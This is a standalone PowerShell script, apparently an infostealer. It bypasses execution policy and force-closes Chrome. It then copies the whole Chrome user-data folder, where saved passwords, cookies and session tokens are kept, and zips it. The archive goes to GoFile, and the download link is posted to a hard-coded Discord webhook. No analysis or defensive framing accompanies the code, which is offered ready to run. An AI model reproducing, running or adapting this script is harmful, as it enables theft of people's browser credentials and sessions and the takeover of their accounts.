# Ensure execution policy is bypassed
Set-ExecutionPolicy Bypass -Scope Process -Force

# Configuration
$botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
$chatID = "your-chat-id"                # Replace with your Telegram chat ID
$webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ81XN_CHsT3eOSQnAV7XraeCcMJFrkYugTolNcnztAnLbiq516mTB0"       # Replace with your Discord Webhook URL
$logFile = "$env:TEMP\debug_log.txt"    # Log file path

# Force close Chrome to ensure files aren't in use
function Force-CloseChrome {
    Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
    Log-Message "Force closed Chrome."
}

# Logging function
function Log-Message {
    param([string]$message)
    Add-Content -Path $logFile -Value $message
}

# Send Discord message
function Send-DiscordMessage {
    param ([string]$message)
    try {
        Log-Message "Sending message to Discord: $message"
        Invoke-RestMethod -Uri $webhook -Method Post -Body @{content = $message} | Out-Null
        Log-Message "Message sent: $message"
    } catch {
        Log-Message "Failed to send Discord message: $_"
    }
}

# Upload the file to GoFile
function Upload-FileToGoFile {
    param ([string]$filePath)

    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/servers' -Method Get
    if (-not $serverResponse.data.servers) {
        Send-DiscordMessage "Failed to retrieve GoFile servers."
        return $null
    }

    $uploadServer = $serverResponse.data.servers[0].name
    $uploadUri = "https://$uploadServer.gofile.io/contents/uploadfile"

    try {
        $form = @{ file = Get-Item -LiteralPath $filePath }
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -Form $form

        if ($response.status -eq "ok" -and $response.data.downloadPage) {
            Log-Message "File uploaded successfully. Link: $($response.data.downloadPage)"
            Send-DiscordMessage "File uploaded: $($response.data.downloadPage)"
            return $response.data.downloadPage
        } else {
            Log-Message "Failed to upload file."
            Send-DiscordMessage "Failed to upload file to GoFile."
            return $null
        }
    } catch {
        Log-Message "Error during file upload: $_"
        Send-DiscordMessage "Error uploading file."
        return $null
    }
}

# Copy Chrome User Data with retry logic
function Copy-ChromeData {
    param ([string]$source, [string]$destination)

    $retryCount = 0
    $maxRetries = 3
    $success = $false

    while ($retryCount -lt $maxRetries -and !$success) {
        try {
            Copy-Item -Path $source -Destination $destination -ErrorAction Stop
            $success = $true
        } catch [System.IO.IOException] {
            $retryCount++
            Log-Message "File locked, retrying: $source ($retryCount/$maxRetries)"
            Start-Sleep -Seconds 2
        } catch {
            Log-Message "Error copying file: $_"
        }
    }

    return $success
}

# Main process
function Main {
    # Prepare directories and file paths
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
    $outputZip = "$env:TEMP\chrome_data.zip"
    $tempFolder = "$env:TEMP\ChromeBackup"

    # Step 1: Force close Chrome
    Force-CloseChrome

    # Step 2: Prepare the temp folder
    if (Test-Path $tempFolder) { Remove-Item -Recurse -Force $tempFolder }
    New-Item -ItemType Directory -Path $tempFolder | Out-Null

    # Step 3: Copy Chrome User Data
    Get-ChildItem -Path $chromePath -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $destination = $_.FullName -replace [regex]::Escape($chromePath), $tempFolder
        if (-not (Test-Path $destination)) { New-Item -ItemType Directory -Path (Split-Path -Parent $destination) -Force | Out-Null }
        if (Copy-ChromeData -source $_.FullName -destination $destination) {
            Log-Message "Copied: $($_.FullName)"
        } else {
            Log-Message "Skipped locked file: $($_.FullName)"
        }
    }

    # Step 4: Compress and clean up
    Compress-Archive -Path "$tempFolder\*" -DestinationPath $outputZip -Force
    Remove-Item -Recurse -Force $tempFolder

    # Step 5: Upload the zip file to GoFile
    if (Test-Path $outputZip) {
        Upload-FileToGoFile -filePath $outputZip
    } else {
        Log-Message "Zip file not found."
        Send-DiscordMessage "Failed to create the zip file."
    }
}

# Run the main function
Main
